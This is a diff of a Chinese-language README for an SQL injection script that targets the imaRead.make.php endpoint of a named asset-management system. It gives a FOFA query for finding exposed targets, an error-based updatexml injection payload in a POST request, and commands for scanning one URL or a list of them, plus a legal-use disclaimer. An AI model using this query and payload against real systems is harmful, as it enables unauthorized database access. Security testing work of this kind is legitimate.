@@ -1,29 +1,50 @@
-# SQL注入脚本
-渗透项目/渗透工具/脚本文件
+# SQL 注入自动化脚本
 
-例如：***系统的imaRead.make.php接口存在SQL注入
+渗透项目 / 渗透工具 / 脚本文件
 
-FOFA:
+---
 
+## 🔍 漏洞详情与原理
+
+### 1. 漏洞概述
+**系统的 `imaRead.make.php` 接口存在高危 SQL 注入漏洞。
+
+### 2. 资产测绘 (FOFA)
+
+可通过以下 FOFA 语句在全球资产中搜索受影响的目标网址：
+    
     body="不要着急，点此"
+   
+3. 漏洞证明 (POC)
+漏洞通过 POST 请求触发，参数 feeItem[] 未经过安全过滤，直接带入数据库执行。利用 updatexml 报错注入函数，可成功爆出对 12345678 进行 MD5 散列后的报错回显：
 
-POC：
+        HTTP
+        POST /adminx/imaRead.make.php?act=remake HTTP/1.1
 
-    POST /adminx/imaRead.make.php?act=remake HTTP/1.1
-  
-    feeItem[]=1+AND+updatexml(1,concat(0x7e,md5(12345678)),1)
+        feeItem[]=1+AND+updatexml(1,concat(0x7e,md5(12345678)),1)
 
-Example:（##免责声明：仅用于科学上网绿色实验健康学习##）
+🚀 脚本运行指南
+🚫 免责声明
+⚠️ （##免责声明：仅用于科学上网绿色实验健康学习##）
+本脚本仅用于法律授权的甲方自查、合规的白帽渗透测试及网络安全教学实验。严禁用于任何未授权的非法攻击行为。任何因非合规使用导致的法律后果，均由使用者本人承担！
 
-!!!本脚本是python环境下运行：
+🛠️ 环境与准备工作
+!!! 本脚本是 python 环境下运行：
 
-  1.FOFA语句搜索出网址
-  
-  2.可将网址统一带协议保存到文本文件中
-  
-  3.调用脚本:(切记要切到这个根目录下显示脚本文件的目录;并且-f读取文件时要注意路径:在文件名称前+路径/文件名,可以是相对路径可以是绝对路径一定是能让系统识别到的路径才能读取到文件)
-  
-    python3 百易云资管系统imaRead.make.phpSQL注入.py -u yoururl
-    
-    python3 百易云资管系统imaRead.make.phpSQL注入.py -f filename.txt
-    
+使用上面的 FOFA语句 搜索出网址。
+
+可将网址统一带协议（如 http:// 或 https://）保存到文本文件中。
+
+💻 命令行调用方法（⚠️核心注意事项）
+💡 避坑提示（切记）：
+
+运行脚本前，切记要切到这个根目录下，让终端显示出脚本文件的目录。
+
+并且在使用 -f 读取文件时要注意路径：在文件名称前 + 路径/文件名。可以是相对路径，也可以是绝对路径，总之一定是能让系统识别到的路径才能读取到文件。
+
+🔹 示例 1：检测单个目标 URL (-u)
+Bash
+python3 Read.make.phpSQL注入.py -u yoururl
+🔹 示例 2：批量读取文本进行扫描 (-f)
+Bash
+python3 Read.make.phpSQL注入.py -f filename.txt
